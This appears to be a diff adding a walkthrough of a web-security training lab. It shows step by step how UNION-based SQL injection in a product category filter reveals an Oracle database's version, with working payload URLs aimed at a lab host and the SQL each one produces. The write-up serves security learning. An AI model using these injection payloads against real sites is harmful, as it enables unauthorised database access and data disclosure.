@@ -1,0 +1,34 @@
+Problem description:
+Lab: SQL injection attack, querying the database type and version on Oracle
+
+End Goal: To display the database type and version on Oracle database using a UNION attack
+
+Step 1:
+Check for SQL vulnerablity in the category filter by adding '
+https://0ac7001204b74c28825c83d300820043.web-security-academy.net/filter?category='
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = '''
+Observation: you should get an Internal server error due to syntax violation
+
+Step2:
+Inject SQL while correcting syntax violation
+https://0ac7001204b74c28825c83d300820043.web-security-academy.net/filter?category='--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = ''
+Observation: website should display the data normally
+
+Step3:
+add UNION clause with the help of DUAL table to find the number of text columns by firstly adding one column , this is trial and error
+https://0ac7001204b74c28825c83d300820043.web-security-academy.net/filter?category=Gifts' union select  'abc' from dual--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT 'abc' from DUAL
+Observation: we got Internal server error since the table dimensions don't match
+
+Step4:
+add UNION clause to find the number of text columsn, this time two sample texts
+https://0ac7001204b74c28825c83d300820043.web-security-academy.net/filter?category=Gifts 'union select  'abc', 'def' from dual--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT 'abc', 'def' from DUAL
+Observation: The website works normally, displaying the unioned fields at the end.
+
+Step5:
+use banner column and v$version table to reveal the database type and version
+https://0ac7001204b74c28825c83d300820043.web-security-academy.net/filter?category=Gifts 'union select banner, null from v$version--
+Executed Command: SELECT * FROM PRODUCTS WHERE CATEGORY = 'Gifts' UNION SELECT BANNER, NULL from v$version
+Observation: The website works normally while also reveal meta information about the database
